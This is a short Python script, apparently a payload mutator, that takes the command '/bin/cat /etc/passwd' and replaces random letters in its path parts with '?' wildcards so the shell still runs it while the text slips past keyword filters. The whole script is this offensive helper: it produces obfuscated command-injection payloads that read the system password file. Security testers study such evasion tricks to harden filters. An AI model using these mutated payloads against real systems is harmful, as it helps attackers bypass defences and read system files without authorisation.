import re
import random

comando = "/bin/cat /etc/passwd"
payloadMUT1 = comando
payloadMUT3 = re.split(r'/', payloadMUT1)
filteredarray = []

for i in payloadMUT3:
    filteredarray.extend(re.findall(r'\b[^\W\d_]+\b', i))

# Create the updated string
updated_str = ''
for i, a in enumerate(filteredarray):
    if i == 1:
        updated_str += a + ' '
    else:
        updated_str += a.replace(random.choice(a), '?') + '/'

updated_str = updated_str[:-1] # remove the last '/'
print(updated_str)
